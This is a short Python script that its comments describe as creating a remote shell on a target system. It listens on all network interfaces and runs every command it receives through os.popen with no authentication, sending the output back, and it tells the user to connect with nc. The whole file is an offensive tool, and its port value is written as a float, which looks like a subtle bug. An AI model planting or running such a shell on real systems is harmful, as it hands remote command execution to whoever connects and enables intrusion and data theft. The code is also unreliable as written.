# Creates a remote shell on a target system and waits for a connection
# Use nc <target_ip> <target port> to connect and run shell commands

import socket
import os

SERVER_HOST = '0.0.0.0' # Listen on all interface addresses
SERVER_PORT = 1234.     # Bind to this port

def handle_connection(conn, addr):
    print(f"[+] New connection acccepted from {addr[0]}:{addr[1]}")

    while True:
        try:

            command = conn.recv(1024).decode()
            if not command:
                break
            output = os.popen(command).read()
            conn.send(output.encode())

        except Exception as e:
            print(f"[-] Error: {e}")
            break

    conn.close()
    print(f"[+] Connection closed from {addr[0]}:{addr[1]}")

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((SERVER_HOST, SERVER_PORT))
    server_socket.listen(5)
    print(f"[*] Listening on {SERVER_HOST}:{SERVER_PORT}")

    while True:
        conn, addr = server_socket.accept()
        handle_connection(conn, addr)

if __name__ == '__main__':
    main()
